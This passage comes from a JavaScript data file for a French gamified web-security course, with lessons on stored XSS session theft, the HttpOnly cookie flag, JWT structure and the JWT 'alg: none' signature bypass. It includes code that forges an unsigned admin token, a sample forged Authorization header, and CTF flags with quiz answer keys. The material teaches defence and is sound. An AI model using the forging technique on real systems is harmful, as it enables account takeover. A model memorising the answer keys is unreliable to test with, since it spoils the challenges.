          { text: "Parce qu'elle ne fonctionne que la nuit.", isCorrect: false, debrief: "Faux. Elle s'exécute à toute heure dès consultation." }
        ]
      }
    },
    challenge: {
      type: 'webmail_target',
      instructions: "Dans SkyMail, rédige un message contenant le payload d'exfiltration. Dans le panneau DevTools du bas, récupère le drapeau CYBER{...} capturé lors du vol de session !",
      flag: 'CYBER{STORED_XSS_ADMIN_COOKIE_EXFILTRATED}'
    }
  },

  // 8. Vol de Cookies & Protection HttpOnly
  {
    id: 'm4-l8',
    unitId: 'm4',
    title: "8. Vol de Session & Le Drapeau HttpOnly",
    icon: '🛡️',
    xp: 45,
    lessonSlides: [
      {
        title: "L'Objectif n°1 du XSS : Voler la Session",
        bullets: [
          "Faire apparaître des boîtes de dialogue `alert(1)` ne sert qu'à démontrer la présence d'une faille.",
          "Dans une attaque réelle, le script malveillant lit `document.cookie` en secret et envoie la clé de session vers le serveur du pirate.",
          "Une fois en possession de ce jeton, le pirate prend le contrôle total du compte cible sans jamais avoir connu son mot de passe !"
        ]
      },
      {
        title: "Le Bouclier Indispensable : Le Flag HttpOnly",
        bullets: [
          "Comment les architectes web peuvent-ils interdire ce vol ?",
          "En ajoutant le mot-clé **HttpOnly** lors de la création du cookie : `Set-Cookie: session=xyz; HttpOnly; Secure`.",
          "Quand ce flag est présent, le navigateur **interdit formellement à tout code JavaScript** (y compris le code malveillant injecté via XSS) de lire ou d'accéder au cookie via `document.cookie` !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="107" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">Cookie SANS HttpOnly</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">document.cookie lisible en JS</text>
          <text x="107" y="85" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">💥 Vol de session immédiat !</text>
          <rect x="210" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="292" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Cookie AVEC HttpOnly</text>
          <text x="292" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Inaccessible en JavaScript</text>
          <text x="292" y="85" fill="#10b981" font-size="9" font-family="monospace" text-anchor="middle">🛡️ Protégé contre le vol XSS</text>
        </svg>
      `,
      codeSnippet: {
        language: 'http',
        lines: [
          { num: 1, text: "HTTP/1.1 200 OK" },
          { num: 2, text: "Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict", isCritical: true, note: "Le drapeau HttpOnly bloque l'accès à la propriété document.cookie en JavaScript" }
        ],
        prompt: "Clique sur l'attribut de sécurité de l'en-tête qui neutralise le vol de cookie par XSS :"
      },
      tokenPuzzle: {
        instruction: "Tape la directive de sécurité Set-Cookie protégeant les jetons de session :",
        tokens: ["Set-Cookie: session=xyz;", "HttpOnly;", "Secure;", "alert(1);"],
        correctOrder: ["Set-Cookie: session=xyz;", "HttpOnly;", "Secure;"]
      },
      quickQuiz: {
        prompt: "Quelle protection concrète le drapeau (flag) 'HttpOnly' apporte-t-il à un cookie de session ?",
        options: [
          { text: "Il interdit formellement au code JavaScript exécuté dans la page d'accéder au cookie via document.cookie.", isCorrect: true, debrief: "Exactement ! Le cookie est transporté uniquement dans les en-têtes HTTP et masqué au JavaScript." },
          { text: "Il oblige l'utilisateur à taper son mot de passe toutes les 30 secondes.", isCorrect: false, debrief: "Faux. HttpOnly n'affecte pas la fréquence de frappe du mot de passe." },
          { text: "Il interdit au serveur d'éteindre sa carte réseau.", isCorrect: false, debrief: "Faux. Cela n'a aucun rapport matériel." },
          { text: "Il supprime automatiquement les e-mails reçus.", isCorrect: false, debrief: "Faux. HttpOnly est un attribut de sécurité de cookie." }
        ]
      }
    },
    challenge: {
      type: 'webmail_target',
      instructions: "Dans le Webmail SkyMail, analyse l'intercepteur de requêtes HTTP du panneau inférieur et soumets la valeur du drapeau de cookie dérobé CYBER{...} !",
      flag: 'CYBER{STORED_XSS_ADMIN_COOKIE_EXFILTRATED}'
    }
  },

  // 9. Décoder un Jeton JWT (JSON Web Token)
  {
    id: 'm4-l9',
    unitId: 'm4',
    title: "9. Anatomie d'un Jeton JWT",
    icon: '🎟️',
    xp: 45,
    lessonSlides: [
      {
        title: "Le Passeport Moderne du Web : JWT",
        bullets: [
          "Les applications modernes et les API utilisent massivement les jetons **JWT** (JSON Web Tokens).",
          "Un JWT est un passeport d'identité numérique encodé en texte compact, composé de **trois parties séparées par des points** :",
          "`HEADER.PAYLOAD.SIGNATURE`"
        ]
      },
      {
        title: "Les Trois Parties Décortiquées",
        bullets: [
          "1. **Header** (En-tête) : indique l'algorithme de chiffrement (souvent `{\"alg\": \"HS256\", \"typ\": \"JWT\"}`).",
          "2. **Payload** (Données) : contient les informations de ton compte (ex: `{\"user\": \"operator\", \"role\": \"analyst\"}`).",
          "3. **Signature** : calculée à partir du Header, du Payload et d'une clé secrète connue uniquement du serveur pour empêcher toute modification.",
          "Attention : le Header et le Payload ne sont **PAS chiffrés**, ils sont simplement encodés en **Base64Url** et lisibles par n'importe qui !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="30" width="105" height="60" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="77" y="55" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">HEADER</text>
          <text x="77" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">{"alg":"HS256"}</text>
          <text x="135" y="65" fill="#fff" font-size="16" font-family="monospace" text-anchor="middle">.</text>
          <rect x="145" y="30" width="110" height="60" rx="8" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
          <text x="200" y="55" fill="#60a5fa" font-size="11" font-family="monospace" text-anchor="middle">PAYLOAD</text>
          <text x="200" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">{"role":"user"}</text>
          <text x="260" y="65" fill="#fff" font-size="16" font-family="monospace" text-anchor="middle">.</text>
          <rect x="270" y="30" width="105" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="322" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">SIGNATURE</text>
          <text x="322" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">HMACSHA256</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// Décodage du Payload d'un jeton JWT en clair :" },
          { num: 2, text: "const payload = JSON.parse(atob(token.split('.')[1]));", isCritical: true, note: "Le split('.')[1] isole le payload Base64Url sans clé secrète requise" },
          { num: 3, text: "console.log(payload); // { id: 1001, role: 'user' }" }
        ],
        prompt: "Clique sur l'instruction JavaScript qui extrait et décode le payload du JWT :"
      },
      tokenPuzzle: {
        instruction: "Ordonne les 3 segments constitutifs d'un jeton JWT standard :",
        tokens: ["HEADER", ".", "PAYLOAD", ".", "SIGNATURE"],
        correctOrder: ["HEADER", ".", "PAYLOAD", ".", "SIGNATURE"]
      },
      quickQuiz: {
        prompt: "Les données contenues dans le Payload d'un JWT standard (non JWE) sont-elles chiffrées et confidentielles ?",
        options: [
          { text: "Non, elles sont simplement encodées en Base64Url et n'importe qui peut les décoder et les lire instantanément.", isCorrect: true, debrief: "Exact ! Base64Url n'est PAS un chiffrement. Ne stockez jamais de données confidentielles dans un JWT." },
          { text: "Oui, elles sont protégées par une clé militaire inviolable.", isCorrect: false, debrief: "Faux. Un simple décodage base64 révèle tout en clair." },
          { text: "Seul l'opérateur téléphonique peut les lire.", isCorrect: false, debrief: "Faux. N'importe qui possédant le jeton peut lire le JSON." },
          { text: "Elles s'effacent automatiquement si on les ouvre.", isCorrect: false, debrief: "Faux. C'est une simple chaîne textuelle ASCII." }
        ]
      }
    },
    challenge: {
      type: 'jwt_target',
      instructions: "Dans la console Gateway JWT ci-dessous, examine le Header du jeton par défaut. Soumets l'algorithme cryptographique utilisé (HS256) !",
      flag: 'HS256'
    }
  },

  // 10. Exploitation de la Faille JWT alg: none
  {
    id: 'm4-l10',
    unitId: 'm4',
    title: "10. La Faille JWT de Légende : alg: none",
    icon: '🔓',
    xp: 50,
    lessonSlides: [
      {
        title: "La Spécification RFC Qui a Tout Cassé",
        bullets: [
          "Dans la spécification officielle des JWT (RFC 7519), les créateurs ont inclus un algorithme spécial nommé **none** pour les tests ou les jetons non signés.",
          "Mais des bibliothèques de code mal conçues ont commis une erreur dramatique : elles vérifient la signature en fonction de l'algorithme **annoncé par le jeton lui-même** !"
        ]
      },
      {
        title: "Devenir Admin Sans Clé Secrète",
        bullets: [
          "L'attaque est d'une simplicité désarmante :",
          "1. L'attaquant modifie le Header en remplaçant `\"alg\": \"HS256\"` par `\"alg\": \"none\"`.",
          "2. Dans le Payload, il change `\"role\": \"user\"` en `\"role\": \"admin\"`.",
          "3. Il supprime complètement la signature à la fin (en laissant le point final : `HEADER.PAYLOAD.`).",
          "Le serveur lit `alg: none`, conclut qu'aucune signature n'est requise, valide le jeton et accorde les pleins pouvoirs d'administrateur !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="107" y="50" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle">{"alg":"none"}</text>
          <text x="107" y="70" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">{"role":"admin"}</text>
          <text x="107" y="85" fill="#f43f5e" font-size="9" font-family="monospace" text-anchor="middle">Signature = VIDE</text>
          <path d="M 200 60 L 235 60" stroke="#10b981" stroke-width="2"/>
          <rect x="245" y="25" width="140" height="70" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="315" y="50" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle">Vérification : PASS</text>
          <text x="315" y="70" fill="#34d399" font-size="9" font-family="monospace" text-anchor="middle">Accès Root Accordé !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// Forger un faux jeton administrateur non signé avec alg: none :" },
          { num: 2, text: "const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));", isCritical: true, note: "alg: none ordonne à la bibliothèque de contourner la vérification de signature" },
          { num: 3, text: "const payload = btoa(JSON.stringify({ user: 'admin', role: 'admin' }));" },
          { num: 4, text: "const fakeToken = `${header}.${payload}.`; // Remarquez le point final sans signature !" }
        ],
        prompt: "Clique sur la ligne définissant l'algorithme 'none' :"
      },
      tokenPuzzle: {
        instruction: "Assemble le header JSON exploitant la vulnérabilité alg: none :",
        tokens: ["{", "\"alg\": \"none\",", "\"typ\": \"JWT\"", "}"],
        correctOrder: ["{", "\"alg\": \"none\",", "\"typ\": \"JWT\"", "}"]
      },
      quickQuiz: {
        prompt: "Pourquoi la vulnérabilité 'alg: none' permet-elle d'usurper n'importe quel rôle sans connaître la clé secrète du serveur ?",
        options: [
          { text: "Parce que la bibliothèque vérifie la signature selon l'algorithme choisi par le client, et accepte les jetons sans signature si le header annonce 'none'.", isCorrect: true, debrief: "Exact ! Le serveur écoute aveuglément le client au lieu d'imposer son propre algorithme." },
          { text: "Parce que le mot 'none' est le mot de passe secret universel de Linux.", isCorrect: false, debrief: "Faux. 'none' est un mot-clé de la spécification RFC, pas un mot de passe." },
          { text: "Parce que cela convertit le serveur en passerelle FTP.", isCorrect: false, debrief: "Faux. Cela ne modifie aucun protocole de transport." },
          { text: "Parce que cela vide le cache DNS du fournisseur.", isCorrect: false, debrief: "Faux. Le DNS n'intervient pas dans la validation du JWT." }
        ]
      }
    },
    challenge: {
      type: 'jwt_target',
      instructions: "Dans la console JWT Gateway, bascule l'algorithme sur 'none', change le rôle en 'admin' et valide le jeton pour usurper les accès. Soumets le drapeau CYBER{...} accordé !",
      flag: 'CYBER{JWT_ALG_NONE_SIGNATURE_BYPASS_SUCCESS}'
    }
  },

  // 11. Boss Fight Web Client : Chaîne d'Exploitation IDOR & JWT
  {
    id: 'm4-l11',
    unitId: 'm4',
    title: "11. ★ BOSS FIGHT CLIENT : IDOR & JWT ★",
    icon: '👑',
    xp: 100,
    isBoss: true,
    lessonSlides: [
      {
        title: "L'Épreuve Finale de Sécurité Côté Client",
        bullets: [
          "Tu as appris à dissocier le client du backend, à manipuler les DevTools F12, à comprendre les cookies et l'impact de `HttpOnly`, à exploiter les failles de contrôle d'accès IDOR, à distinguer XSS réfléchie et XSS stockée, et à forger des faux jetons d'authentification JWT.",
          "Pour remporter le badge de la Piste 4, falsifie le jeton JWT avec `alg: none` pour obtenir le statut administrateur suprême et valider la compromission client !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="20" y="20" width="360" height="80" rx="10" fill="#030712" stroke="#f59e0b" stroke-width="2"/>
          <text x="200" y="55" fill="#fbbf24" font-size="14" font-family="monospace" text-anchor="middle" font-weight="bold">★ ÉPREUVE D'HOMOLOGATION CLIENT PRO ★</text>
          <text x="200" y="75" fill="#94a3b8" font-size="11" font-family="monospace" text-anchor="middle">Manipulation DevTools ➔ Falsification JWT alg: none</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "# Exploitation de la passerelle API avec jeton falsifié alg: none :" },
          { num: 2, text: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.", isCritical: true, note: "Jeton forgé valide permettant la prise de contrôle immédiate" },
          { num: 3, text: "Status: 200 OK - Access Granted" }
        ],
        prompt: "Clique sur l'en-tête Authorization transportant le jeton alg: none forgé :"
      },
      tokenPuzzle: {
        instruction: "Construis l'en-tête HTTP complet avec le porteur du jeton d'authentification :",
        tokens: ["Authorization:", "Bearer", "HEADER.PAYLOAD.", "Cookie:"],
        correctOrder: ["Authorization:", "Bearer", "HEADER.PAYLOAD."]
      },
      quickQuiz: {
        prompt: "Comment une équipe de développement peut-elle éliminer définitivement la vulnérabilité 'alg: none' sur son infrastructure ?",
        options: [
          { text: "En forçant explicitement l'algorithme attendu (ex: HS256) lors de la vérification, en rejetant catégoriquement tout algorithme non approuvé.", isCorrect: true, debrief: "Exactement ! Le backend doit imposer son algorithme sans jamais croire celui déclaré par le client." },
          { text: "En interdisant les caractères alphabétiques dans les mots de passe.", isCorrect: false, debrief: "Faux. Cela réduirait considérablement la sécurité." },
          { text: "En redémarrant le serveur web toutes les heures.", isCorrect: false, debrief: "Faux. Le redémarrage ne corrige aucun bogue de validation." },
          { text: "En masquant le code HTML de la page d'accueil.", isCorrect: false, debrief: "Faux. C'est de la sécurité par l'obscurité totalement inefficace." }
        ]
      }
    },
    challenge: {
      type: 'jwt_target',
      instructions: "Dans la console JWT Gateway, configure l'algorithme sur 'none', le rôle sur 'admin' et soumets le jeton à l'évaluation pour valider la mission !",
      flag: 'CYBER{JWT_ALG_NONE_SIGNATURE_BYPASS_SUCCESS}'
    }
  }
];
